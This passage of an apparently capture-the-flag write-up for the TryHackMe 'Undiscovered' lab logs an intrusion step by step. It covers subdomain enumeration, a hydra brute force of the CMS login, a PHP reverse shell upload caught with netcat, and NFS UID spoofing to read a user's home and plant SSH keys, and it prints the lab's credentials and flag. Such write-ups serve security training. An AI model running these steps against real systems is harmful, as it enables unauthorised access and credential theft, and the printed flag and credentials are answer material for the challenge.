+</span></span><span class=line><span class=cl>|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)
+</span></span><span class=line><span class=cl>80/tcp   open  http    Apache httpd 2.4.18
+</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.18 (Ubuntu)
+</span></span><span class=line><span class=cl>|_http-title: Did not follow redirect to http://undiscovered.thm
+</span></span><span class=line><span class=cl>111/tcp  open  rpcbind 2-4 (RPC #100000)
+</span></span><span class=line><span class=cl>| rpcinfo:
+</span></span><span class=line><span class=cl>|   program version    port/proto  service
+</span></span><span class=line><span class=cl>|   100000  2,3,4        111/tcp   rpcbind
+</span></span><span class=line><span class=cl>|   100000  2,3,4        111/udp   rpcbind
+</span></span><span class=line><span class=cl>|   100000  3,4          111/tcp6  rpcbind
+</span></span><span class=line><span class=cl>|   100000  3,4          111/udp6  rpcbind
+</span></span><span class=line><span class=cl>|   100003  2,3,4       2049/tcp   nfs
+</span></span><span class=line><span class=cl>|   100003  2,3,4       2049/tcp6  nfs
+</span></span><span class=line><span class=cl>|   100003  2,3,4       2049/udp   nfs
+</span></span><span class=line><span class=cl>|   100003  2,3,4       2049/udp6  nfs
+</span></span><span class=line><span class=cl>|   100021  1,3,4      35002/udp   nlockmgr
+</span></span><span class=line><span class=cl>|   100021  1,3,4      36838/tcp   nlockmgr
+</span></span><span class=line><span class=cl>|   100021  1,3,4      36993/tcp6  nlockmgr
+</span></span><span class=line><span class=cl>|   100021  1,3,4      51734/udp6  nlockmgr
+</span></span><span class=line><span class=cl>|   100227  2,3         2049/tcp   nfs_acl
+</span></span><span class=line><span class=cl>|   100227  2,3         2049/tcp6  nfs_acl
+</span></span><span class=line><span class=cl>|   100227  2,3         2049/udp   nfs_acl
+</span></span><span class=line><span class=cl>|_  100227  2,3         2049/udp6  nfs_acl
+</span></span><span class=line><span class=cl>2049/tcp open  nfs     2-4 (RPC #100003)
+</span></span><span class=line><span class=cl>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+</span></span><span class=line><span class=cl>TCP/IP fingerprint:
+</span></span><span class=line><span class=cl>OS:SCAN(V=7.80%E=4%D=10/30%OT=22%CT=1%CU=44466%PV=Y%DS=2%DC=T%G=Y%TM=5F9BE2
+</span></span><span class=line><span class=cl>OS:D2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OP
+</span></span><span class=line><span class=cl>OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
+</span></span><span class=line><span class=cl>OS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC
+</span></span><span class=line><span class=cl>OS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+</span></span><span class=line><span class=cl>OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+</span></span><span class=line><span class=cl>OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+</span></span><span class=line><span class=cl>OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+</span></span><span class=line><span class=cl>OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+</span></span><span class=line><span class=cl>OS:D=S)
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Network Distance: 2 hops
+</span></span><span class=line><span class=cl>Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>TRACEROUTE (using port 1723/tcp)
+</span></span><span class=line><span class=cl>HOP RTT      ADDRESS
+</span></span><span class=line><span class=cl>1   29.83 ms 10.8.0.1
+</span></span><span class=line><span class=cl>2   29.97 ms 10.10.59.152
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 24.71 seconds
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ gobuster vhost -u http://undiscovered.thm/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>Gobuster v3.0.1
+</span></span><span class=line><span class=cl>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>[+] Url:          http://undiscovered.thm/
+</span></span><span class=line><span class=cl>[+] Threads:      10
+</span></span><span class=line><span class=cl>[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+</span></span><span class=line><span class=cl>[+] User Agent:   gobuster/3.0.1
+</span></span><span class=line><span class=cl>[+] Timeout:      10s
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>2020/10/30 10:57:52 Starting gobuster
+</span></span><span class=line><span class=cl>===============================================================
+</span></span><span class=line><span class=cl>Found: manager.undiscovered.thm (Status: 200) [Size: 4584]
+</span></span><span class=line><span class=cl>Found: dashboard.undiscovered.thm (Status: 200) [Size: 4626]
+</span></span><span class=line><span class=cl>Found: deliver.undiscovered.thm (Status: 200) [Size: 4650]
+</span></span><span class=line><span class=cl>Found: newsite.undiscovered.thm (Status: 200) [Size: 4584]
+</span></span><span class=line><span class=cl>Found: develop.undiscovered.thm (Status: 200) [Size: 4584]
+</span></span><span class=line><span class=cl>Found: forms.undiscovered.thm (Status: 200) [Size: 4542]
+</span></span><span class=line><span class=cl>Found: maintenance.undiscovered.thm (Status: 200) [Size: 4668]
+</span></span><span class=line><span class=cl>Found: network.undiscovered.thm (Status: 200) [Size: 4584]
+</span></span><span class=line><span class=cl>Found: view.undiscovered.thm (Status: 200) [Size: 4521]
+</span></span><span class=line><span class=cl>Found: mailgate.undiscovered.thm (Status: 200) [Size: 4605]
+</span></span><span class=line><span class=cl>Found: play.undiscovered.thm (Status: 200) [Size: 4521]
+</span></span><span class=line><span class=cl>Found: start.undiscovered.thm (Status: 200) [Size: 4542]
+</span></span><span class=line><span class=cl>Found: booking.undiscovered.thm (Status: 200) [Size: 4599]
+</span></span><span class=line><span class=cl>Found: terminal.undiscovered.thm (Status: 200) [Size: 4605]
+</span></span><span class=line><span class=cl>Found: gold.undiscovered.thm (Status: 200) [Size: 4521]
+</span></span><span class=line><span class=cl>Found: internet.undiscovered.thm (Status: 200) [Size: 4605]
+</span></span><span class=line><span class=cl>Found: resources.undiscovered.thm (Status: 200) [Size: 4626]
+</span></span></code></pre></td></tr></table></div></div><p><code>manager.undiscovered.thm dashboard.undiscovered.thm deliver.undiscovered.thm newsite.undiscovered.thm develop.undiscovered.thm forms.undiscovered.thm maintenance.undiscovered.thm network.undiscovered.thm view.undiscovered.thm mailgate.undiscovered.thm play.undiscovered.thm start.undiscovered.thm booking.undiscovered.thm terminal.undiscovered.thm gold.undiscovered.thm internet.undiscovered.thm resources.undiscovered.thm</code></p><p><a href=http://deliver.undiscovered.thm/>http://deliver.undiscovered.thm/</a></p><p><code>Powered by RiteCMS Version:2.2.1</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form &#34;/cms/index.php:username=^USER^&amp;userpw=^PASS^:User unknown or password wrong&#34; -f
+</span></span><span class=line><span class=cl>Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-30 11:13:22
+</span></span><span class=line><span class=cl>[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+</span></span><span class=line><span class=cl>[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=^USER^&amp;userpw=^PASS^:User unknown or password wrong
+</span></span><span class=line><span class=cl>[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool
+</span></span><span class=line><span class=cl>[STATUS] attack finished for deliver.undiscovered.thm (valid pair found)
+</span></span><span class=line><span class=cl>1 of 1 target successfully completed, 1 valid password found
+</span></span><span class=line><span class=cl>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-30 11:13:29
+</span></span></code></pre></td></tr></table></div></div><p><code>admin:liverpool</code></p><p><img loading=lazy src=/writeups/tryhackme/undiscovered/2020-10-30_11-14.png alt></p><p><img loading=lazy src=/writeups/tryhackme/undiscovered/2020-10-30_11-24.png alt></p><p><a href="http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&action=upload&directory=files">http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&amp;action=upload&amp;directory=files</a></p><p><a href=http://deliver.undiscovered.thm/files/php-reverse-shell.php>http://deliver.undiscovered.thm/files/php-reverse-shell.php</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>Undiscovered</span><span class=o>$</span> <span class=n>nc</span> <span class=o>-</span><span class=n>lvnp</span> <span class=mi>9001</span>
+</span></span><span class=line><span class=cl><span class=n>Listening</span> <span class=n>on</span> <span class=mf>0.0</span><span class=o>.</span><span class=mf>0.0</span> <span class=mi>9001</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span> <span class=n>received</span> <span class=n>on</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>141.31</span> <span class=mi>60756</span>
+</span></span><span class=line><span class=cl><span class=n>Linux</span> <span class=n>undiscovered</span> <span class=mf>4.4</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>189</span><span class=o>-</span><span class=n>generic</span> <span class=c1>#219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+</span></span><span class=line><span class=cl> <span class=mi>23</span><span class=p>:</span><span class=mi>10</span><span class=p>:</span><span class=mi>38</span> <span class=n>up</span> <span class=mi>1</span> <span class=nb>min</span><span class=p>,</span>  <span class=mi>0</span> <span class=n>users</span><span class=p>,</span>  <span class=nb>load</span> <span class=n>average</span><span class=p>:</span> <span class=mf>0.20</span><span class=p>,</span> <span class=mf>0.15</span><span class=p>,</span> <span class=mf>0.06</span>
+</span></span><span class=line><span class=cl><span class=n>USER</span>     <span class=n>TTY</span>      <span class=n>FROM</span>             <span class=n>LOGIN</span><span class=err>@</span>   <span class=n>IDLE</span>   <span class=n>JCPU</span>   <span class=n>PCPU</span> <span class=n>WHAT</span>
+</span></span><span class=line><span class=cl><span class=n>uid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>gid</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span> <span class=n>groups</span><span class=o>=</span><span class=mi>33</span><span class=p>(</span><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>sh</span><span class=p>:</span> <span class=mi>0</span><span class=p>:</span> <span class=n>can</span><span class=s1>&#39;t access tty; job control turned off</span>
+</span></span><span class=line><span class=cl><span class=o>$</span> <span class=n>python</span> <span class=o>-</span><span class=n>c</span> <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>undiscovered</span><span class=p>:</span><span class=o>/$</span> <span class=o>^</span><span class=n>Z</span>
+</span></span><span class=line><span class=cl><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>+</span>  <span class=n>Stopped</span>                 <span class=n>nc</span> <span class=o>-</span><span class=n>lvnp</span> <span class=mi>9001</span>
+</span></span><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>Undiscovered</span><span class=o>$</span> <span class=n>stty</span> <span class=n>raw</span> <span class=o>-</span><span class=n>echo</span>
+</span></span><span class=line><span class=cl><span class=n>kali</span><span class=err>@</span><span class=n>kali</span><span class=p>:</span><span class=o>~/</span><span class=n>CTFs</span><span class=o>/</span><span class=n>tryhackme</span><span class=o>/</span><span class=n>Undiscovered</span><span class=o>$</span> <span class=n>nc</span> <span class=o>-</span><span class=n>lvnp</span> <span class=mi>9001</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>undiscovered</span><span class=p>:</span><span class=o>/$</span> <span class=k>export</span> <span class=n>TERM</span><span class=o>=</span><span class=n>xterm</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>undiscovered</span><span class=p>:</span><span class=o>/$</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>undiscovered</span><span class=p>:</span><span class=o>/$</span> <span class=n>cat</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>exports</span>
+</span></span><span class=line><span class=cl><span class=c1># /etc/exports: the access control list for filesystems which may be exported</span>
+</span></span><span class=line><span class=cl><span class=c1>#               to NFS clients.  See exports(5).</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># Example for NFSv2 and NFSv3:</span>
+</span></span><span class=line><span class=cl><span class=c1># /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl><span class=c1># Example for NFSv4:</span>
+</span></span><span class=line><span class=cl><span class=c1># /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)</span>
+</span></span><span class=line><span class=cl><span class=c1># /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)</span>
+</span></span><span class=line><span class=cl><span class=c1>#</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>william</span>   <span class=o>*</span><span class=p>(</span><span class=n>rw</span><span class=p>,</span><span class=n>root_squash</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>undiscovered</span><span class=p>:</span><span class=o>/$</span> <span class=n>cat</span> <span class=o>/</span><span class=n>etc</span><span class=o>/</span><span class=n>passwd</span> <span class=o>|</span> <span class=n>grep</span> <span class=n>william</span>
+</span></span><span class=line><span class=cl><span class=n>william</span><span class=p>:</span><span class=n>x</span><span class=p>:</span><span class=mi>3003</span><span class=p>:</span><span class=mi>3003</span><span class=p>::</span><span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>william</span><span class=p>:</span><span class=o>/</span><span class=n>bin</span><span class=o>/</span><span class=n>bash</span>
+</span></span><span class=line><span class=cl><span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>undiscovered</span><span class=p>:</span><span class=o>/$</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>william:x:3003:3003::/home/william:/bin/bash
+</span></span><span class=line><span class=cl>leonard:x:1002:1002::/home/leonard:/bin/bash
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo useradd -u 3003 william
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo useradd -u 1002 leonard
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo passwd william
+</span></span><span class=line><span class=cl>New password:
+</span></span><span class=line><span class=cl>Retype new password:
+</span></span><span class=line><span class=cl>passwd: password updated successfully
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo passwd leonard
+</span></span><span class=line><span class=cl>New password:
+</span></span><span class=line><span class=cl>Retype new password:
+</span></span><span class=line><span class=cl>passwd: password updated successfully
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mkdir -p /mnt/undiscoverd/william
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mkdir -p /mnt/undiscoverd/leonard
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo usermod -aG sudo leonard
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo usermod -aG sudo william
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo mount -t nfs 10.10.141.31:/home/william /mnt/undiscoverd/william
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mount -t nfs 10.10.141.31:/home/william /mnt/undiscoverd/william
+</span></span><span class=line><span class=cl>[sudo] password for kali:
+</span></span><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo su william
+</span></span><span class=line><span class=cl>$ 123
+</span></span><span class=line><span class=cl>sh: 1: 123: not found
+</span></span><span class=line><span class=cl>$ /bin/bash
+</span></span><span class=line><span class=cl>william@kali:/home/kali/CTFs/tryhackme/Undiscovered$ cd /mnt/undiscoverd/william
+</span></span><span class=line><span class=cl>william@kali:/mnt/undiscoverd/william$ ls
+</span></span><span class=line><span class=cl>admin.sh  script  user.txt
+</span></span><span class=line><span class=cl>william@kali:/mnt/undiscoverd/william$ cat user.txt
+</span></span><span class=line><span class=cl>THM{8d7b7299cccd1796a61915901d0e091c}
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
+</span><span class=lnt>  2
+</span><span class=lnt>  3
+</span><span class=lnt>  4
+</span><span class=lnt>  5
+</span><span class=lnt>  6
+</span><span class=lnt>  7
+</span><span class=lnt>  8
+</span><span class=lnt>  9
+</span><span class=lnt> 10
+</span><span class=lnt> 11
+</span><span class=lnt> 12
+</span><span class=lnt> 13
+</span><span class=lnt> 14
+</span><span class=lnt> 15
+</span><span class=lnt> 16
+</span><span class=lnt> 17
+</span><span class=lnt> 18
+</span><span class=lnt> 19
+</span><span class=lnt> 20
+</span><span class=lnt> 21
+</span><span class=lnt> 22
+</span><span class=lnt> 23
+</span><span class=lnt> 24
+</span><span class=lnt> 25
+</span><span class=lnt> 26
+</span><span class=lnt> 27
+</span><span class=lnt> 28
+</span><span class=lnt> 29
+</span><span class=lnt> 30
+</span><span class=lnt> 31
+</span><span class=lnt> 32
+</span><span class=lnt> 33
+</span><span class=lnt> 34
+</span><span class=lnt> 35
+</span><span class=lnt> 36
+</span><span class=lnt> 37
+</span><span class=lnt> 38
+</span><span class=lnt> 39
+</span><span class=lnt> 40
+</span><span class=lnt> 41
+</span><span class=lnt> 42
+</span><span class=lnt> 43
+</span><span class=lnt> 44
+</span><span class=lnt> 45
+</span><span class=lnt> 46
+</span><span class=lnt> 47
+</span><span class=lnt> 48
+</span><span class=lnt> 49
+</span><span class=lnt> 50
+</span><span class=lnt> 51
+</span><span class=lnt> 52
+</span><span class=lnt> 53
+</span><span class=lnt> 54
+</span><span class=lnt> 55
+</span><span class=lnt> 56
+</span><span class=lnt> 57
+</span><span class=lnt> 58
+</span><span class=lnt> 59
+</span><span class=lnt> 60
+</span><span class=lnt> 61
+</span><span class=lnt> 62
+</span><span class=lnt> 63
+</span><span class=lnt> 64
+</span><span class=lnt> 65
+</span><span class=lnt> 66
+</span><span class=lnt> 67
+</span><span class=lnt> 68
+</span><span class=lnt> 69
+</span><span class=lnt> 70
+</span><span class=lnt> 71
+</span><span class=lnt> 72
+</span><span class=lnt> 73
+</span><span class=lnt> 74
+</span><span class=lnt> 75
+</span><span class=lnt> 76
+</span><span class=lnt> 77
+</span><span class=lnt> 78
+</span><span class=lnt> 79
+</span><span class=lnt> 80
+</span><span class=lnt> 81
+</span><span class=lnt> 82
+</span><span class=lnt> 83
+</span><span class=lnt> 84
+</span><span class=lnt> 85
+</span><span class=lnt> 86
+</span><span class=lnt> 87
+</span><span class=lnt> 88
+</span><span class=lnt> 89
+</span><span class=lnt> 90
+</span><span class=lnt> 91
+</span><span class=lnt> 92
+</span><span class=lnt> 93
+</span><span class=lnt> 94
+</span><span class=lnt> 95
+</span><span class=lnt> 96
+</span><span class=lnt> 97
+</span><span class=lnt> 98
+</span><span class=lnt> 99
+</span><span class=lnt>100
+</span><span class=lnt>101
+</span><span class=lnt>102
+</span><span class=lnt>103
+</span><span class=lnt>104
+</span><span class=lnt>105
+</span><span class=lnt>106
+</span><span class=lnt>107
+</span><span class=lnt>108
+</span><span class=lnt>109
+</span><span class=lnt>110
+</span><span class=lnt>111
+</span><span class=lnt>112
+</span><span class=lnt>113
+</span><span class=lnt>114
+</span><span class=lnt>115
+</span><span class=lnt>116
+</span><span class=lnt>117
+</span><span class=lnt>118
+</span><span class=lnt>119
+</span><span class=lnt>120
+</span><span class=lnt>121
+</span><span class=lnt>122
+</span><span class=lnt>123
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo su william
+</span></span><span class=line><span class=cl>$ <span class=m>123</span>
+</span></span><span class=line><span class=cl>sh: 1: 123: not found
+</span></span><span class=line><span class=cl>$ /bin/bash
+</span></span><span class=line><span class=cl>william@kali:/home/kali/CTFs/tryhackme/Undiscovered$ <span class=nb>cd</span> /mnt/undiscoverd/william
+</span></span><span class=line><span class=cl>william@kali:/mnt/undiscoverd/william$ ls
+</span></span><span class=line><span class=cl>admin.sh  script  user.txt
+</span></span><span class=line><span class=cl>william@kali:/mnt/undiscoverd/william$ cat user.txt
+</span></span><span class=line><span class=cl>THM<span class=o>{</span>8d7b7299cccd1796a61915901d0e091c<span class=o>}</span>
+</span></span><span class=line><span class=cl>william@kali:/mnt/undiscoverd/william$ mkdir .ssh
+</span></span><span class=line><span class=cl>william@kali:/mnt/undiscoverd/william$ <span class=nb>cd</span> .ssh/
+</span></span><span class=line><span class=cl>william@kali:/mnt/undiscoverd/william/.ssh$ ssh-keygen -f william
+</span></span><span class=line><span class=cl>Generating public/private rsa key pair.
+</span></span><span class=line><span class=cl>Enter passphrase <span class=o>(</span>empty <span class=k>for</span> no passphrase<span class=o>)</span>:
+</span></span><span class=line><span class=cl>Enter same passphrase again:
+</span></span><span class=line><span class=cl>Your identification has been saved in william
+</span></span><span class=line><span class=cl>Your public key has been saved in william.pub
+</span></span><span class=line><span class=cl>The key fingerprint is:
+</span></span><span class=line><span class=cl>SHA256:3kiWEQ/cM5Wy1fGlEPQ4G95msZ2pR7YX0P20ZMdfBJk william@kali
+</span></span><span class=line><span class=cl>The key<span class=s1>&#39;s randomart image is:
+</span></span></span><span class=line><span class=cl><span class=s1>+---[RSA 3072]----+
+</span></span></span><span class=line><span class=cl><span class=s1>|       .o. o=+o=o|
+</span></span></span><span class=line><span class=cl><span class=s1>|        .+= o+E=o|
+</span></span></span><span class=line><span class=cl><span class=s1>|        . .*+.++B|
+</span></span></span><span class=line><span class=cl><span class=s1>|         o.. =+=O|
+</span></span></span><span class=line><span class=cl><span class=s1>|        S   o =B+|
+</span></span></span><span class=line><span class=cl><span class=s1>|       + o   o+ o|
+</span></span></span><span class=line><span class=cl><span class=s1>|        o .  . o.|
+</span></span></span><span class=line><span class=cl><span class=s1>|              . .|
+</span></span></span><span class=line><span class=cl><span class=s1>|                 |
+</span></span></span><span class=line><span class=cl><span class=s1>+----[SHA256]-----+
+</span></span></span><span class=line><span class=cl><span class=s1>william@kali:/mnt/undiscoverd/william/.ssh$ ls
+</span></span></span><span class=line><span class=cl><span class=s1>william  william.pub
+</span></span></span><span class=line><span class=cl><span class=s1>william@kali:/mnt/undiscoverd/william/.ssh$ chmod 600 william
